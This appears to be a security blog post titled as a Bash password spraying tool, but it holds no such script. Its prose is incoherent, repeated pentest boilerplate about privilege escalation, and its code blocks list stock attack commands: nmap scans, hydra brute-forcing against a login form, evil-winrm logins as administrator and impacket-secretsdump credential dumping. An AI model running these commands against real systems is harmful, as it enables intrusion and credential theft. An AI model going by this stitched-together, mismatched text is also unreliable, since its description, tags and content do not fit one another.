---
TitleSEO: "Password Spraying Tool in Bash | ZureFX"
TitlePost: "Password Spraying Tool — Bash"
Author: "ZureFX"
Description: "A Bash script for password spraying tool. Built for security research and automation."
Keywords: "go, c, parser, bash"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-971.html"
URL_IMAGES: ""
Date: "2026-03-13"
Tags: "Go, C, Parser, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-971"
Permalink: "/scripting/script-password-spraying-tool-971.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `chisel`
- `lookupsid`
- `secretsdump`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

```bash
nmap -sCV -p135,139,443 10.111.211.131 -oN scan.txt
evil-winrm -i 10.67.14.57 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.132.136 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.63.44.104
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.99.182.165/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.79.119.125 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5432,636,3389 10.77.233.124 -oN scan.txt
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p21,993,25 10.32.83.171 -oN scan.txt
evil-winrm -i 10.94.115.58 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 24.27s
```
